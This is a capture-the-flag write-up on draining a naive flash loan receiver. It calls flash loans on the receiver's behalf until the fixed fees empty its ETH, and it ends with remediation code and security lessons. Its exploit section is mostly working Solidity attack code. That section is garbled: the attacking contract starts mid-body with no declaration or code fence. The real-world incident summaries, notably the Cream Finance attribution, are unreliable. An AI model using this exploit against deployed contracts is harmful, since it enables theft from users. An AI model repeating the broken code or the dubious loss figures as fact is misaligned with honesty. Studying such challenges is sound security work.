> **Flash Loan Fee Drainage** - Exploit a naive flash loan receiver by repeatedly calling flash loans on their behalf

## 📋 Challenge Overview

**Objective**: Drain all ETH from the receiver contract  
**Success Criteria**: Receiver contract should have 0 ETH balance  
**Initial Setup**: Receiver has 10 ETH, Pool has 1000 ETH  
**Target**: `FlashLoanReceiver` contract via `NaiveReceiverLenderPool`

### 🎯 The Scenario
A user has deployed a contract that can receive flash loans from a pool. The pool offers flash loans of ETH with a 1 ETH fixed fee. The user's contract has 10 ETH to pay for flash loan fees, but there's a critical flaw in the access control.

## 🔍 Vulnerability Analysis

### **The Root Cause**
The `NaiveReceiverLenderPool` allows **anyone** to request flash loans on behalf of **any receiver**:

```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    if (token != ETH) revert UnsupportedCurrency();
    if (amount >= ETHER_IN_POOL) revert NotEnoughLiquidity();

    uint256 balanceBefore = address(this).balance;
    
    // 🚨 NO ACCESS CONTROL - Anyone can call on behalf of any receiver!
    receiver.onFlashLoan(msg.sender, ETH, amount, FIXED_FEE, data);
    
    if (address(this).balance < balanceBefore + FIXED_FEE) 
        revert RepayFailed();

    return true;
}
```

### **The Vulnerable Receiver**
```solidity
contract FlashLoanReceiver is IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        if (msg.sender != pool) revert UntrustedLender();
        if (token != ETH) revert UnsupportedCurrency();

        // 💸 CRITICAL: Always pays fees regardless of who initiated!
        assembly {
            pop(call(gas(), caller(), fee, 0, 0, 0, 0))
        }

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

### **The Problem**
1. **Pool**: No access control - anyone can initiate flash loans for any receiver
2. **Receiver**: Always pays fees regardless of who initiated the loan
3. **Attack**: Repeatedly call flash loans on receiver's behalf until drained

## ⚡ Exploit Implementation

### **Attack Strategy**
Call flash loan 10 times on behalf of the victim receiver:

        receiver = _receiver;
    }
    
    function exploit() external {
        // Receiver starts with 10 ETH, fee is 1 ETH per flash loan
        // We need 10 flash loans to drain all ETH
        
        uint256 receiverBalance = receiver.balance;
        uint256 fee = pool.FIXED_FEE();
        uint256 callsNeeded = receiverBalance / fee;
        
        // Drain receiver by calling flash loans on their behalf
        for (uint256 i = 0; i < callsNeeded; i++) {
            pool.flashLoan(
                IERC3156FlashBorrower(receiver),
                ETH,
                0, // Amount doesn't matter, fee is fixed
                ""
            );
        }
        
        // Receiver should now have 0 ETH
        assert(receiver.balance == 0);
    }
    
    // Alternative: Single transaction exploit
    function singleTxExploit() external {
        // More gas efficient - all in one transaction
        while (receiver.balance >= pool.FIXED_FEE()) {
            pool.flashLoan(
                IERC3156FlashBorrower(receiver),
                ETH,
                0,
                ""
            );
        }
    }
    
    // Gas optimized version
    function optimizedExploit() external {
        uint256 fee = pool.FIXED_FEE();
        address receiverAddr = receiver;
        NaiveReceiverLenderPool poolContract = pool;
        
        // Unroll loop for gas savings
        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
    }
}

## 🛡️ Real-World Examples

### **Cream Finance Attack Pattern**
Similar access control issues led to massive losses:
- Attackers called functions on behalf of other users
- Drained user funds through repeated operations
- $130M lost due to access control failures

### **bZx Protocol (2020)**
- Flash loan manipulation attacks
- Users' funds drained through protocol interactions
- $8M lost in multiple attacks

## 🔧 Remediation

### **❌ Current Vulnerable Code**
```solidity
function flashLoan(IERC3156FlashBorrower receiver, ...) external {
    // No access control!
    receiver.onFlashLoan(msg.sender, ETH, amount, FIXED_FEE, data);
}
```

### **✅ Fixed Code - Access Control**
```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    if (token != ETH) revert UnsupportedCurrency();
    if (amount >= ETHER_IN_POOL) revert NotEnoughLiquidity();
    
    // ✅ FIX 1: Only receiver can call for themselves
    if (msg.sender != address(receiver)) revert UnauthorizedCaller();
    
    uint256 balanceBefore = address(this).balance;
    receiver.onFlashLoan(msg.sender, ETH, amount, FIXED_FEE, data);
    
    if (address(this).balance < balanceBefore + FIXED_FEE) 
        revert RepayFailed();
    
    return true;
}
```

### **✅ Alternative Fix - Receiver Authorization**
```solidity
mapping(address => mapping(address => bool)) public authorizedCallers;

function authorize(address caller) external {
    authorizedCallers[msg.sender][caller] = true;
}

function flashLoan(IERC3156FlashBorrower receiver, ...) external returns (bool) {
    // ✅ FIX 2: Check authorization
    if (msg.sender != address(receiver) && 
        !authorizedCallers[address(receiver)][msg.sender]) {
        revert UnauthorizedCaller();
    }
    // ...
}
```

### **✅ Enhanced Receiver Protection**
```solidity
contract SecureFlashLoanReceiver is IERC3156FlashBorrower {
    address private owner;
    mapping(address => bool) private authorizedInitiators;
    
    modifier onlyAuthorized(address initiator) {
        require(
            initiator == owner || authorizedInitiators[initiator],
            "Unauthorized initiator"
        );
        _;
    }
    
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override onlyAuthorized(initiator) returns (bytes32) {
        // ✅ Now protected against unauthorized flash loans
        // ... flash loan logic
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

## 🎓 Security Lessons

### **Key Takeaways**
1. **Access Control is Critical** - Always verify who can call functions
2. **Third-party Integration Risk** - Don't trust external callers by default
3. **Fee Payment Logic** - Consider who pays and when
4. **Flash Loan Security** - Receiver must validate initiator

### **Best Practices**
- ✅ Implement proper access control on sensitive functions
- ✅ Validate flash loan initiators in receivers
- ✅ Consider using pull-over-push patterns for fees
- ✅ Add rate limiting for expensive operations
- ✅ Test with malicious actors in mind

### **Common Anti-patterns**
```solidity
// ❌ BAD: Anyone can call on behalf of anyone
function operation(address target) external {
    target.call(data);
}

// ✅ GOOD: Only target can call for themselves  
function operation() external {
    // msg.sender is implicitly the target
    _performOperation(msg.sender);
}

// ✅ GOOD: Explicit authorization required
function operation(address target) external {
    require(authorized[target][msg.sender], "Not authorized");
    _performOperation(target);
}
```

## 💡 Advanced Concepts

### **Flash Loan Security Model**
```
Traditional Loan:
1. Borrow funds
2. Use funds over time  
3. Repay with interest

Flash Loan:
1. Borrow funds
2. Use funds atomically
3. Repay in same transaction
4. Revert if not repaid
```

### **ERC-3156 Standard Issues**
The ERC-3156 flash loan standard has potential security issues:
- No built-in access control
- Relies on receiver implementation
- Fee payment responsibility unclear

### **Attack Patterns**
1. **Fee Drainage**: Repeatedly trigger fee payments
2. **Reentrancy**: Call flash loan from within callback
3. **Griefing**: DoS through repeated expensive operations
4. **Front-running**: Observe and exploit flash loan transactions
